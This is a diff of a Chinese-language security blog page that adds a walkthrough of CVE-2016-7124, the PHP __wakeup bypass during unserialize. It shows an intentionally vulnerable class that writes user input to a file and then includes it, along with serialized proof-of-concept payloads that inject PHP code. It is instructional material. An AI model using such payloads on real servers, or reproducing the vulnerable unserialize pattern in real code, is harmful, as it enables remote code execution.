@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.3k
                 </div>
                 
 
@@ -707,6 +707,45 @@ __wakeup将在序列化之后立即被调用<span aria-hidden="true" class="line
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqv20yrr35j30xb0ak778.jpg" alt="image-20210525224352047"></p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqv231k2fdj30t203h0t1.jpg" alt="image-20210525224552853"></p>
+<h2 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h2><h3 id="1-wakeup函数简介"><a href="#1-wakeup函数简介" class="headerlink" title="1. __wakeup函数简介:"></a>1. __wakeup函数简介:</h3><p><code>unserialize()</code>会检查是否存在一个<code>__wakeup()</code>方法，如果存在，就会首先调用这个方法，<strong>预先准备对象需要的资源</strong></p>
+<ul>
+<li><strong>反序列化的额时候如果对象属性个数的值大于真是的属性个数的时候会跳过<code>__wakeup</code>执行</strong></li>
+</ul>
+<h3 id="2-漏洞影响版本："><a href="#2-漏洞影响版本：" class="headerlink" title="2. 漏洞影响版本："></a>2. 漏洞影响版本：</h3><ul>
+<li>php5 &lt; 5.6.25</li>
+<li>php7 &lt; 7.0.10</li>
+</ul>
+<h3 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现:"></a>3. 漏洞复现:</h3><p><strong>代码如下:</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"wakeup!"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hello.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello.php"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./hello.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>魔法函数要比__destruct()函数首先执行，所以我门直接传入</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">O:1:"A":1:&#123;s:6:"target";s:19:"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>首先会被执行的是<code>__wakeup()</code>函数，这时候<code>target</code>函数值会被覆盖为<code>wakeup!</code>,然后生成<code>hello.php</code>里面的内容是<code>__wakeup</code></p>
+<p>考虑绕过:</p>
+<ul>
+<li>属性个数的值大于真实属性个数时就会跳过__wakeup执行</li>
+</ul>
+<p>构造POC：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">O:1:"A":2:&#123;s:6:"target";s:19:"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvhqnz7b4j30ym0faq6c.jpg" alt="image-20210526074733666"></p>
 
                 
             </div>
